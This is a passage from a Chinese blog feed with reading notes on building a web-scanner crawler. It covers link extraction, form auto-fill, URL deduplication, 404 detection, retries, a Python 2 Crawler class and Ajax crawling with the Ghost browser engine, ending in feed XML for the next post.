为标签所有的属性，并按照(name,value) 的元组以列表形式存储，这里attrs 值为： <code>[(&#39;href&#39;,&#39;http://www.baidu.com&#39;)]</code> ,当遇到对应结束标签时，如： <code>&lt;/a&gt;</code>, 就会调用函数<code>handle_a_tag_end(tag)</code>, 因此，可以重载这些处理函数来完成URL提取，部分核心代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F35.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F36.png" alt="此处输入图片的描述"></p><h4 id="3-自动填表"><a href="#3-自动填表" class="headerlink" title="(3)自动填表"></a><strong>(3)自动填表</strong></h4><p>为了实现自动填写表单的功能， <strong>需要建立常见表单字段与内容的对应关系</strong>，并<strong>生成表单知识库</strong>。<strong>如果表单字段存在于该知识库中，那么就可以用对应的内容进行填充</strong>，从而完成自动填表的功能。 常见的表单字段信息如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F37.png" alt="此处输入图片的描述"></p><p>显然， 如果上述表单<strong>知识库</strong>中的表单字段越多， 那么自动化填写的能力就越强。这里主要是为了讲解原理和实现功能， 就不继续丰富表单知识库了，暂且以现有的这些表单字段来实现自动填表， 部分实现代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F38.png" alt="此处输入图片的描述"></p><h3 id="5-URL-去重去似"><a href="#5-URL-去重去似" class="headerlink" title="5.URL 去重去似"></a><strong>5.URL 去重去似</strong></h3><h4 id="1-URL-去重"><a href="#1-URL-去重" class="headerlink" title="(1)URL 去重"></a><strong>(1)URL 去重</strong></h4><p>前面提到过的两种方式：布隆过滤器和 hash表</p><h5 id="1-布隆过滤器-1"><a href="#1-布隆过滤器-1" class="headerlink" title="1.布隆过滤器"></a><strong>1.布隆过滤器</strong></h5><p>这里有两个实现布隆算法的Python模块，可以直接使用它们进行URL去重，如下</p><blockquote><p><strong>Python-bloomfilter</strong> </p><p>Github 地址为 <a href="https://github.com/jaybaird/Python-bloomfilter" target="_blank" rel="noopener">https://github.com/jaybaird/Python-bloomfilter</a></p><p><strong>Pybloomfiltermmap</strong></p><p>Github 地址为 <a href="https://github.com/axiak/pybloomfiltermmap" target="_blank" rel="noopener">https://github.com/axiak/pybloomfiltermmap</a><br>官方文档为：<a href="https://axiak.github.io/pybloomfiltermmap/" target="_blank" rel="noopener">https://axiak.github.io/pybloomfiltermmap/</a></p></blockquote><p><strong>这里我们用 Pybloomfiltermmap 模块进行介绍，</strong></p><p>在Pybloomfiltermmap模块中，实现了两类布隆过滤器： Bloomfilter和ScalableBloomfilter</p><p>其中，Bloomfilter是个定容的过滤器，error_rate是指最大的误报率；ScalableBloomfilter是一个不定容最的布隆过滤器，它可以不断添加元素。方法add是添加元素，如果元素已经在布隆过滤器中，那么返回True;如果不在，那么返回False</p><p><strong>具体实现：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F39.png" alt="此处输入图片的描述"></p><h5 id="2-Hash-表去重"><a href="#2-Hash-表去重" class="headerlink" title="2.Hash 表去重"></a><strong>2.Hash 表去重</strong></h5><p>还可以用Hash表去重，其原理非常简单，通过遍历原URL列表，判断每个URL是否在去重后的列表中，如果不在列表中，那么彻添加到去重后的列表中；如果在列表中，那么直接忽略即可，具体方法如下。</p><h6 id="方法一：利用内存-Hash-表去重"><a href="#方法一：利用内存-Hash-表去重" class="headerlink" title="方法一：利用内存 Hash 表去重"></a><strong>方法一：利用内存 Hash 表去重</strong></h6><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F40.png" alt="此处输入图片的描述"></p><p>在实际的爬行中， URL的长度其实并不固定， 而且随着爬行深度的增加， 单个URL的长 度会越来越长。如果此时仍然使用URL作为Key值进行去重，显然不太合理，这样内存和性能都会损耗过快。此时可以对URL进行Hash运算压缩， 比如：16位的md5运算。 这样就可 以把URL的长度固定为16字节，从而提高去重的效率， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F41.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F42.png" alt="此处输入图片的描述"></p><h6 id="方法二：利用-BerkeleyDB-去重"><a href="#方法二：利用-BerkeleyDB-去重" class="headerlink" title="方法二：利用 BerkeleyDB 去重"></a><strong>方法二：利用 BerkeleyDB 去重</strong></h6><p>首先， 从Oracle官网(<a href="http://www.oracle.com/technetwork/cn/database/database-technologies/" target="_blank" rel="noopener">http://www.oracle.com/technetwork/cn/database/database-technologies/</a> berkeleydb/downloads/index.html)下载Berkeley DB的源码。</p><p>还需要安装Python的bsddb3模块。 它提供了BerkeleyDB数据库的操作接口，这样就可以在Python中使用该数据库了</p><p><strong>具体实现：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F43.png" alt="此处输入图片的描述"></p><h4 id="2-URL-去似去含"><a href="#2-URL-去似去含" class="headerlink" title="(2)URL 去似去含"></a><strong>(2)URL 去似去含</strong></h4><p><strong>具体实现：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F44.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F45.png" alt="此处输入图片的描述"></p><p><strong>测试代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F46.png" alt="此处输入图片的描述"></p><h3 id="6-404-页面的识别"><a href="#6-404-页面的识别" class="headerlink" title="6.404 页面的识别"></a><strong>6.404 页面的识别</strong></h3><p>404页面识别并不能简单地靠状态码信息，<strong>首先需要建立404页面知识库，然后从状态码和页面内容两个维度进行准确识别</strong>，这样就可以极大地提高404页面识别的准确度(这里的知识库我理解就是数据对应关系的意思，或者理解为数据库)。</p><p>我们可以通过随机<strong>构造一些明显不存在的网站来触发目标的 404 页面</strong>， 比如：tscrumer_404_nofound.html、no_exists_for_test.html等。在实际的文件名构造中，可以加入随机因子， 避免重名问题，然后将这些页面的特征进行提取和存储，建立对应的404页面知识库。</p><p><strong>具体方法：</strong></p><p>可以通过状态码，以及与现有的 404 页面知识库进行404 页面识别。 具体的识别逻辑为：如果当前页面的状态码为 404, 那么它为 404 页面；如果当前页面的状态码不是 404,那么将该页面与 404 页面知识库中的页面进行内容相似度比较，如果相识度高千阙值，那么判定当前页面为404 页面。 <strong>部分核心代码实现如下</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F47.png" alt="此处输入图片的描述"></p><h3 id="7-断连重试"><a href="#7-断连重试" class="headerlink" title="7.断连重试"></a><strong>7.断连重试</strong></h3><p>在使用 Requests 模块进行网络通信时，如果网络连接不可用或断开，那么该模块会抛出相应的异常，我们可以<strong>通过捕获异常来实现断连重试的功能</strong>。为了对爬虫程序的结构影响最小，这里可以利用Python 中的<strong>装饰器来实现断连重试</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F48.png" alt="此处输入图片的描述"></p><h3 id="8-爬虫实现"><a href="#8-爬虫实现" class="headerlink" title="8.爬虫实现"></a><strong>8.爬虫实现</strong></h3><p>至此，爬虫的基础功能都已实现了，下面就根据爬虫的结构，将这些功能进行整合，实现最终版本的Web爬虫，这里用Crawler类对Web爬虫进行封装实现，部分实现代码和结构如下：</p><pre><code># coding=utf-8&apos;&apos;&apos;crawler.py&apos;&apos;&apos;import sysimport tracebackimport itertoolsimport timefrom Queue import Queuefrom LogManager import log as om# HTTPRequestfrom teye_web.http.URL import URLfrom teye_web.http.Request import Requestfrom teye_web.http.Response import Response# url functionfrom teye_web.http.function import is_similar_url# Document Parserimport teye_web.parser.dpCache as dpCache# wCurlfrom wCurl import wcurl# 404 Checkfrom teye_util.page_404 import is_404class Crawler(object):    def __init__(self, depth_limit=1, time_limit=30, req_limit=100, filter_similar=True):        &apos;&apos;&apos;        &apos;&apos;&apos;        self.root = &apos;&apos;        self._target_domain = &apos;&apos;        self.depth_limit = depth_limit        self.time_limit = time_limit        self.req_limit = req_limit        self._sleeptime = 1        self._url_list = []        self._already_visit_url = set()        self._already_seen_urls = set()        self._already_send_reqs = set()        self._relate_ext = [&apos;html&apos;, &apos;shtm&apos;, &apos;htm&apos;, &apos;shtml&apos;]        self._white_ext = [&apos;asp&apos;, &apos;aspx&apos;, &apos;jsp&apos;, &apos;php&apos;, &apos;do&apos;, &apos;action&apos;]        self._black_ext = [&quot;ico&quot;, &quot;jpg&quot;, &quot;gif&quot;, &quot;js&quot;, &quot;png&quot;, &quot;bmp&quot;, &quot;css&quot;, &quot;zip&quot;, &quot;rar&quot;, &quot;ttf&quot;]        self._blockwords = [&apos;mailto:&apos;, &apos;javascript:&apos;, &apos;file://&apos;, &apos;tel:&apos;]        self.num_urls = 0        self.num_reqs = 0        self._wRequestList = []        self._start_time = None        self._other_domains = set()    def get_discovery_time(self):        &apos;&apos;&apos;        爬虫爬行的时间，单位为：分钟        &apos;&apos;&apos;        now = time.time()        diff = now - self._start_time        return diff / 60    def _do_with_reqs(self, reqs):        &apos;&apos;&apos;        &apos;&apos;&apos;        result = []        count = len(reqs)        if reqs is None or count == 0:            return result        for i in xrange(count):            filter = False            filter_url = reqs[i].get_url()            for j in xrange(count - i - 1):                k = i + j + 1                store_url = reqs[k].get_url()                if is_similar_url(filter_url, store_url):                    filter = True                    break            if not filter:                result.append(reqs[i])        return result    def _get_reqs_from_resp(self, response):        &apos;&apos;&apos;        &apos;&apos;&apos;        new_reqs = []        try:            doc_parser = dpCache.dpc.getDocumentParserFor(response)        except Exception, e:            pass        else:            re_urls, tag_urls = doc_parser.get_get_urls()            form_reqs = doc_parser.get_form_reqs()            seen = set()            for new_url in itertools.chain(re_urls, tag_urls):                if new_url in seen:                    continue                seen.add(new_url)                if new_url.get_host() != self._target_domain:                    if new_url.get_host() not in self._other_domains:                        self._other_domains.add(new_url.get_host())                    continue                if new_url not in self._url_list:                    self._url_list.append(new_url)                    wreq = self._url_to_req(new_url, response)                    if wreq not in self._wRequestList:                        new_reqs.append(wreq)                        self._wRequestList.append(wreq)            for item in form_reqs:                if item not in self._wRequestList:                    new_reqs.append(item)                    self._wRequestList.append(item)            return new_reqs    def _url_to_req(self, new_url, response, method=&quot;GET&quot;):        &apos;&apos;&apos;        &apos;&apos;&apos;        req = Request(new_url)        req.set_method(method)        new_referer = response.get_url()        req.set_referer(new_referer)        new_cookies = response.get_cookies()        req.set_cookies(new_cookies)        return req    def crawl(self, root_url):        &apos;&apos;&apos;        将URL对象存入到队列        &apos;&apos;&apos;        if not isinstance(root_url, URL):            root_url_obj = URL(root_url)        else:            root_url_obj = root_url        self._target_domain = root_url_obj.get_host()        self._url_list.append(root_url_obj)        root_req = Request(root_url_obj)        q = Queue()        q.put((root_req, 0))        self._start_time = time.time()        while True:            if q.empty():                print &quot;reqs empty break&quot;                break            this_req, depth = q.get()            # 将静态链接进行过滤            if this_req.get_url().get_ext() in self._black_ext:                continue            # 控制爬行的深度            if depth &gt; self.depth_limit:                print &quot;depth limit break&quot;                break            # 控制爬行的时间            if self.get_discovery_time() &gt; self.time_limit:                print &quot;time limit break&quot;                break            # 控制爬行的链接数，避免内存泄露            if self.num_reqs &gt; self.req_limit:                print &quot;reqs num limit break&quot;                break            if this_req in self._already_send_reqs:                continue            try:                self._already_send_reqs.add(this_req)                om.info(&quot;%s Request:%s&quot; % (this_req.get_method(), this_req.get_url().url_string))                response = None                try:                    response = wcurl._send_req(this_req)                except Exception, e:                    print str(e)                    pass                if is_404(response):                    continue                if response is None:                    continue                # 获取HTTP响应中的请求                new_reqs = self._get_reqs_from_resp(response)                # 过滤相似和包含的请求                filter_reqs = self._do_with_reqs(new_reqs)                depth = depth + 1                for req in filter_reqs:                    q.put((req, depth))                self.num_reqs = len(self._already_send_reqs)                om.info(&quot;Already Send Reqs:&quot; + str(self.num_reqs) + &quot; Left Reqs:&quot; + str(q.qsize()))            except  Exception, e:                traceback.print_exc()                om.info(&quot;ERROR: Can&apos;t process url &apos;%s&apos; (%s)&quot; % (this_req.get_url(), e))                continue            time.sleep(self._sleeptime)        return self._do_with_reqs(self._wRequestList)if __name__ == &quot;__main__&quot;:    &apos;&apos;&apos;    &apos;&apos;&apos;    # url1=&quot;http://testphp.vulnweb.com/showimage.php&quot;    # url2=&quot;http://testphp.vulnweb.com/showimage.php?id=1&quot;    # print is_similar_url(url1,url2)    # sys.exit()    w = Crawler()    wurl = &quot;http://192.168.1.105:8080/wavsep/active/index-sql.jsp&quot;    a = w.crawl(wurl)    for item in a:        # print &quot;\r\n&quot;        # print item        print item.get_url()    print &quot;Found URL Num:&quot; + str(len(a))    sys.exit()</code></pre><h3 id="9-web-2-0-爬虫-重中之重"><a href="#9-web-2-0-爬虫-重中之重" class="headerlink" title="9.web 2.0 爬虫(重中之重)"></a><strong>9.web 2.0 爬虫(重中之重)</strong></h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="(1)基本概念"></a><strong>(1)基本概念</strong></h4><p>在Web 1.0时代，网站主要是基千静态页面来构建的，以单向内容输出为主。到了Web2.0时代， 随着动态脚本的兴起和Ajax技术的发展(Ajax全称为”Asynchronous JavascriptAndXML”,异步JavaScript和XML, 它是一种创建交互式应用的网页开发技术）， Web站点的架构和交互场景也发生了变化，网站中融入了更多的动态交互和事件触发， 这也给传统的Web爬虫提出了新的挑战，因为通过正则匹配的爬取方式显然已经力不从心，它们无法爬取到Web 2.0中的异步请求和事件请求。<strong>在传统Web爬虫的视角里， 每一个URL代表了站点中的一个页面，新页面的URL是可以很容易地通过正则匹配爬取的</strong>。但在Ajax应用中， 这种情况则发生了改变，<strong>一个页面中会有不同的状态，每个状态代表着不同的页面</strong>，因此这些状态也需要被爬取到。<strong>由于状态之间的跳转是通过交互的方式进行触发的， 而传统爬虫并不具备交互的能力，所以它无法进行感知和爬取。</strong></p><p>在了解Web2.0爬虫产生的背景后，我们还需要清楚Ajax的工作方式和特点，其实Ajax不是种新的编程语言，而是 种用千创建更好、 更快， 以及交互性更强的Web应用程序的技术。 它使用 JavaScript向服务器提出请求， 并处理响应而不阻塞用户， 核心对象为 XMLHTTPRequest。通过这个对象，JavaScript可在不重载页面的情况下与Web服务器交换数据， </p><p><strong>工作原理如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F49.png" alt="此处输入图片的描述"></p><p>通俗来讲，Ajax就是一种异步通信请求方式，它允许页面内容可以动态地触发和加载，<strong>所以我们在浏览器中看到的页面其实是不完整的，它只能算是完整页面中的一个状态，</strong> 只有<strong>遍历当前页面中所有的状态后， 才能完整地获取当前页面中所有的URL。</strong></p><h4 id="2-要解决的问题"><a href="#2-要解决的问题" class="headerlink" title="(2)要解决的问题"></a><strong>(2)要解决的问题</strong></h4><p>从上面的内容可以得出： 与传统爬虫相比， Web 2.0爬虫的核心在于<strong>页面事件的触发和页面状态的保持</strong>，但要想满足这两个条件， 则需要解决以下<strong>5个主要问题：</strong></p><h5 id="1-执行JavaScript代码"><a href="#1-执行JavaScript代码" class="headerlink" title="1.执行JavaScript代码"></a><strong>1.执行JavaScript代码</strong></h5><p>由于Ajax应用的功能实现依赖于JavaScript代码在Web客户端的执行， <strong>因此Ajax爬虫必须能够执行JavaScript代码</strong>， 所以需要添加一个JavaScript脚本解释器。</p><h5 id="2-页面DOM树操作"><a href="#2-页面DOM树操作" class="headerlink" title="2.页面DOM树操作"></a><strong>2.页面DOM树操作</strong></h5><p>对页面内容进行DOM树解析， 可以对标签进行动态的操作。</p><h5 id="3-页面事件触发"><a href="#3-页面事件触发" class="headerlink" title="3.页面事件触发"></a><strong>3.页面事件触发</strong></h5><p>由于一些标签包含事件属性， <strong>需要对这些事件触发完成交互， 才能获取新的页面</strong>。 </p><h5 id="4-页面状态保持"><a href="#4-页面状态保持" class="headerlink" title="4.页面状态保持"></a><strong>4.页面状态保持</strong></h5><p>传统的Web站点中每一个URL标志着一个静态页面， <strong>而在Ajax应用中， 一个页面有很多状态的变化， 每当触发一个事件， 都会导致页面发生变化</strong>， 所以Web2.0<strong>爬虫需要记录这些页面状态，以便对变化的页面进行URL提取。</strong></p><h5 id="5-重复事件识别"><a href="#5-重复事件识别" class="headerlink" title="5.重复事件识别"></a><strong>5.重复事件识别</strong></h5><p>Ajax应用中<strong>某些事件可能由同一个JavaScript函数来处理</strong>，触发这些事件可能导致相同状态，而这些重复的事件触发会给服务器带来不必要的负载，所以当同一页面在进行状态变化时，需要记录和识别这些重复事件，避免重复触发和爬取。</p><p>说了那么多枯燥的理论，下面我们就来看一下如何实现Ajax爬虫。为了降低技术难度<strong>，可以使用浏览器引擎来实现(在小型的爬虫中可以选择使用 python 的 Ghost 对 webkit 的封装这种技术，但是这种技术只能说是一种玩具类型的，不能适用于大型项目，这本是这里使用的是 ghost 技术，但是我更推荐使用 headless chrome)</strong>，也许会有读者问，为什么不直接使用JavaScript引擎来处理呢？主要是因为单纯的JavaScript引擎虽然可以执行JS代码，但它无法与DOM树关联起来，也无法有效地对DOM树进行操作。而在浏览器引擎的环境下，JavaScript引擎与DOM树有上下文环境，JS代码可以直接对DOM树进行操作， 所以它可以很好地解决 “执行JavaScript代码” 和 “面DOM树操作” 两个难题，让我们可以更加专注千解决Ajax爬虫的核心问题。</p><blockquote><p><strong>概念：</strong> <strong>页面状态深度</strong><br>页面状态深度就是对当前页面进行事件触发时，<strong>页面新产生的内容中仍然存在需要触发的事件</strong>，我们把<strong>每次的事件触发称之为一个深度</strong>。</p></blockquote><p>下面是AWVS (Acunetix Web Vulnerability Scanner)提供的Web2.0<a href="http://testphp.vulnweb.com/AJAX/index.php" target="_blank" rel="noopener">测试页面</a>，由于它具有代表性，所以这里用它进行说明。我们来看一下， 当单击其中一个链接时， “artists”前后的变化。</p><p><strong>单击链接前的页面， 如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F52.png" alt="此处输入图片的描述"></p><p><strong>单击链接后的页面， 如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F53.png" alt="此处输入图片的描述"></p><p>可以看到，单击后页面在id为contentDiv的层中新增了内容，而这些新增的内容同样需要进行事件触发才能获取后续的URL, 每一次事件的触发称之为一个深度，当前这个测试页面的状态深度为2, 也就是说，它需要两次事件触发才能完整地获取页面的所有URL。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F54.png" alt="此处输入图片的描述"></p><p>下面我们先来梳理一下 Web2.0爬虫的工作流程， 这里用伪代码来说明， 并将页面的状态深度设置为2,实现伪代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F55.png" alt="此处输入图片的描述"></p><blockquote><p>由于篇幅原因，这里先按照书本上的 ghost 这种原始的不优雅的技术内容进行介绍(当然从这种技术上也能看出爬虫编写的基本思想，也是很不错的)，对于 headless chrome 我后面再单独写文章介绍吧(又是给自己留坑了……)。</p></blockquote><p>有了上面的伪代码后， 现在开始进行具体的实现， 这里仍然以AWVS提供的Ajax测试站点(<a href="http://testphp.vulnweb.com/Ajax/index.php)为目标。" target="_blank" rel="noopener">http://testphp.vulnweb.com/Ajax/index.php)为目标。</a></p><p>首先通过Python的Ghost模块引入浏览器引擎，并利用Ghost对象的Open函数打开目标站点，通过下面三行代码即可实现， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F56.png" alt="此处输入图片的描述"></p><p>运行效果如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F56.png" alt="此处输入图片的描述"></p><p>其实Ghost 模块是对WebKit 浏览器引擎的封装，在页面载入的过程中， 它实际上已经完成了DOM 树解析、JS 解析，以及CSS 渲染等一系列工作，这样我们才能看到上图中网页的页面。<strong>但是在这里，我们更关心的是HTTP 请求</strong>。通过查阅PyQt 和Ghost 的官方文档，我们知道，<strong>res对象中存储的内容就是当前页面所发起的网络请求信息，</strong> 这时可以将当前请求的URL打印出来，如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F58.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F59.png" alt="此处输入图片的描述"></p><p>这样每个页面不需要事件触发，主动发起的异步请求信息就可以通过res 对象来获取， 通过其属性值即可获取对应的URL。接下来看一下<strong>如何获取需要交互的URL</strong>。我们先看一下测试站点的网页源代码，页面中存在哪些需要交互的事件， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F60.png" alt="此处输入图片的描述"></p><p>从上面方框中的内容可以看到，事件交互的操作主要体现在a标签中。 当单击a标签后，它就会触发对应的JavaScript函数执行， 当函数执行后，页面的内容就会发生变化，这时就可以获取新的URL。 因此，<strong>在这里可以通过模拟单击对应的a标签，然后通过res对象获取异步请求的URL信息</strong>，并通过更新后的页面内容获取新的事件交互链接，如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F61.png" alt="此处输入图片的描述"></p><p>这样就可以完整地获取单击后发送的异步请求和页面更新后的新页面内容，从而成功地完成一次交互爬取。有了这个成功的经验，接下来就进一步考虑如何对页面进行完整的动态爬取。测试页面中有很多的链接，而且每次单击后页面的内容都会发生变化，显然它并不像单次爬取那么容易，下面就一起来整理一下<strong>完整的爬行思路如下：</strong></p><p>(I)在当前页面HO中，遍历所有的a标签对象，对其进行循环事件触发（如：鼠标单击）。<br>(2)事件触发后，获取浏览器对外新发送的HTTP请求，并记录对应的URL。 同时获取当前的页面内容，记为H1. 并利用正则匹配出页面的URL。<br>(3)在第一次单击后形成的页面H1中， 再次遍历新的a标签， 对其进行循环事件触发。<br>(4)第二次事件触发后，同样获取浏览器对外新发送的HTTP请求， 并记录URL列表。获取当前的页面内容， 记为H1. 并利用正则匹配出页面的URL。</p><p>但这里是有问题的， 细心的读者也许会发现，当我们在第二次遍历新的a标签时，由千无法提前知道a标签的其他唯一属性，如：id、name等，所以只能通过getElementsByTag方法获取存放a标签对象的数组，并通过数组的下标来唯一标识， 伪代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F62.png" alt="此处输入图片的描述"></p><p>而每次进行事件触发后，页面的内容是会发生变化的，这时页面中就会有新的a标签产生，它会导致使用 getElementsByTag(“a”) 的方式所获取到的 a 标签数组不一样， 因此不能使用<br>getElementsByTag(“a”)[i]来唯一标识特定的a标签对象。</p><p><strong>那么， 如何进行改进呢？</strong></p><p>这里主要是由于<strong>页面内容更新后无法对a标签进行唯一标识导致的</strong>， 因此，可以为<strong>每个页面的a标签增加一个唯一标识的属性</strong>。当页面发生变化时，就可以通过对新页面的a标签与变化前页面的a标签进行比较，计算得出新增的a标签，然后再<strong>单独对新增的a标签进行遍历操作</strong>，这样就不会使a标签数组紊乱了。<strong>可以使用a标签的href和onclick两个属性值来构造Hash作为唯一的标识。</strong></p><p>我们需要在页面解析的代码中，增加对a标签的处理，为其增加唯一的识别标识， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F63.png" alt="此处输入图片的描述"></p><p>增加唯一标识后， 再来看看核心部分的完整代码， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F64.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F65.png" alt="此处输入图片的描述"></p><p>下面还需要扩展单击事件触发的操作，可以在Ghost的客户端脚本工具文件utils.js中增加 下列代码：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F66.png" alt="此处输入图片的描述"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X00 前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;目前市面上有关扫描器的书籍大概就是这本 《白帽子讲 web 扫描》了，虽然知道区区 200 多页的书籍内容的深度和广度不会很高，但是还是介绍了一些开发扫描器过程中的基本方法和关键的坑点，对于我这种初学者也算是一本不错的入门级教材了，本文是阅读这本书的读书记录，作为备忘。&lt;/p&gt;
&lt;h2 id=&quot;0X01-如何理解扫描器&quot;&gt;&lt;a href=&quot;#0X01-如何理解扫描器&quot; class=&quot;headerlink&quot; title=&quot;0X01 如何理解扫描器&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 如何理解扫描器&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-概念以及原理&quot;&gt;&lt;a href=&quot;#1-概念以及原理&quot; class=&quot;headerlink&quot; title=&quot;1.概念以及原理&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.概念以及原理&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;Web 扫描器其实是一种&lt;strong&gt;自动化&lt;/strong&gt;的安全弱点和风险检测工具：它的工作方式和原理主要是&lt;strong&gt;通过分析HTTP (s) 请求和响应&lt;/strong&gt;来发现安全问题和风险&lt;/p&gt;
    
    </summary>
    
      <category term="备忘" scheme="https://www.k0rz3n.com/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="备忘" scheme="https://www.k0rz3n.com/tags/%E5%A4%87%E5%BF%98/"/>
    
  </entry>
  
  <entry>
    <title>面向源代码的软件漏洞静态检测综述</title>
    <link href="https://www.k0rz3n.com/2019/03/02/%E9%9D%A2%E5%90%91%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B%E7%BB%BC%E8%BF%B0/"/>
    <id>https://www.k0rz3n.com/2019/03/02/面向源代码的软件漏洞静态检测综述/</id>
    <published>2019-03-02T09:42:18.000Z</published>
    <updated>2019-04-28T14:08:52.066Z</updated>
    
